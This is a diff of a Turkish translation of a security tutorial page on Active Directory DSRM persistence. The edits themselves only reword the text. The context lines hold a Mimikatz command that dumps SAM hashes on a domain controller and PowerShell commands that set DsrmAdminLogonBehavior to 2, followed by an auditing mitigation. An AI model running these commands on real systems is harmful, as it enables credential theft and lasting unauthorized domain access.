@@ -7,7 +7,7 @@ Her **DC** içinde bir **yerel yönetici** hesabı vardır. Bu makinede yönetic
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-Sonra, bu hesabın çalışıp çalışmadığını kontrol etmemiz gerekiyor ve eğer kayıt defteri anahtarı "0" değerine sahipse veya mevcut değilse, **"2" olarak ayarlamanız gerekiyor**:
+Sonra, bu hesabın çalışıp çalışmadığını kontrol etmemiz gerekiyor ve eğer kayıt defteri anahtarı "0" değerine sahipse veya yoksa, **"2" olarak ayarlamanız gerekiyor**:
 ```bash
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
@@ -23,6 +23,4 @@ Daha fazla bilgi için: [https://adsecurity.org/?p=1714](https://adsecurity.org/
 
 ## Azaltma
 
-- Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` denetimi oluşturma/değiştirme
-
-{{#include ../../banners/hacktricks-training.md}}
+- Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` denetim oluşturma/değiştirme
